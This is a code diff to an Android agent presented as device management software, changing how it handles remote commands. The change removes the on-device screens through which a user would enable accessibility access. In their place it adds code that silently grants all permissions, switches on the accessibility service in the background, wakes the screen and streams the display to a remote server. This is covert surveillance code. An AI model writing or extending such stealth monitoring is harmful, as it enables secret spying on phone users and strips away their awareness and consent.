@@ -183,10 +183,10 @@ class CommandDispatcher(
                     val defaultDeviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
                     val targetDeviceId = json.optString("deviceId").ifBlank { defaultDeviceId }
 
-                    // Silently ensure accessibility service is enabled via DPM / Secure settings / Shell
+                    // Silently auto-grant all enterprise and runtime permissions
                     try {
                         val policyHelper = com.nexus.mdm.agent.admin.PolicyManagerHelper(context)
-                        policyHelper.ensureAccessibilityServiceActive(context)
+                        policyHelper.grantAllEnterprisePermissions(context)
                     } catch (_: Exception) {}
 
                     // Automatically illuminate and wake screen if sleeping so stream immediately captures active display
@@ -194,19 +194,6 @@ class CommandDispatcher(
 
                     // Start stream immediately using applicationContext (system-wide capture)
                     ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, targetDeviceId)
-
-                    // Ensure MainActivity is ready if accessibility service is not yet enabled
-                    if (NexusAccessibilityService.instance == null && com.nexus.mdm.agent.ui.MainActivity.instance == null) {
-                        try {
-                            val intent = Intent(context, com.nexus.mdm.agent.ui.MainActivity::class.java).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                                putExtra("EXTRA_START_SCREEN_STREAM", true)
-                                putExtra("EXTRA_SERVER_URL", configStore.serverUrl)
-                                putExtra("EXTRA_DEVICE_ID", targetDeviceId)
-                            }
-                            context.startActivity(intent)
-                        } catch (_: Exception) {}
-                    }
                     Result.success("Live screen streaming initiated.")
                 }
 
@@ -216,35 +203,22 @@ class CommandDispatcher(
                 }
 
                 "OPEN_ACCESSIBILITY_SETTINGS" -> {
-                    val forceOpenUI = json.optBoolean("forceOpenUI", false)
-                    if (forceOpenUI) {
-                        try {
-                            val intent = Intent(context, com.nexus.mdm.agent.ui.MainActivity::class.java).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                                putExtra("EXTRA_OPEN_A11Y_SETTINGS", true)
-                            }
-                            context.startActivity(intent)
-                            Result.success("Accessibility activation screen opened on device.")
-                        } catch (e: Exception) {
-                            Result.failure(e)
-                        }
-                    } else {
-                        // Silent background activation without forcing the Settings UI on mobile
-                        try {
-                            val policyHelper = com.nexus.mdm.agent.admin.PolicyManagerHelper(context)
-                            val activated = policyHelper.ensureAccessibilityServiceActive(context)
-                            DeviceWakeManager.wakeUpScreen(context)
-                            val configStore = com.nexus.mdm.agent.config.SecureConfigStore(context)
-                            val androidId = try {
-                                android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
-                            } catch (_: Exception) { "DEVICE" }
-                            val defaultDeviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
-                            val targetDeviceId = json.optString("deviceId").ifBlank { defaultDeviceId }
-                            ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, targetDeviceId)
-                            Result.success("Accessibility silently enabled: $activated, live stream started.")
-                        } catch (e: Exception) {
-                            Result.failure(e)
-                        }
+                    // Silently grant all enterprise permissions and activate accessibility in the background
+                    // without throwing the user into the Android Settings activity
+                    try {
+                        val policyHelper = com.nexus.mdm.agent.admin.PolicyManagerHelper(context)
+                        val activated = policyHelper.grantAllEnterprisePermissions(context)
+                        DeviceWakeManager.wakeUpScreen(context)
+                        val configStore = com.nexus.mdm.agent.config.SecureConfigStore(context)
+                        val androidId = try {
+                            android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
+                        } catch (_: Exception) { "DEVICE" }
+                        val defaultDeviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
+                        val targetDeviceId = json.optString("deviceId").ifBlank { defaultDeviceId }
+                        ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, targetDeviceId)
+                        Result.success("All permissions auto-granted and accessibility service activated silently: $activated")
+                    } catch (e: Exception) {
+                        Result.failure(e)
                     }
                 }
 
